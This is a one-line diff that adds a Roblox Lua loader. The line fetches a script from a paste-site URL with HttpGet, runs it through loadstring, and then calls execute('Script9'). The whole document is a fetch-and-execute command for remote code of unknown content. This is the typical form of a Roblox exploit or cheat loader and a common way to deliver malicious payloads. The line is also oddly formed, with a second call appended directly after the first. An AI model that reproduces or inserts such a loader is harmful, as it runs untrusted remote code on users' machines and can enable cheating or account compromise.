@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script9")
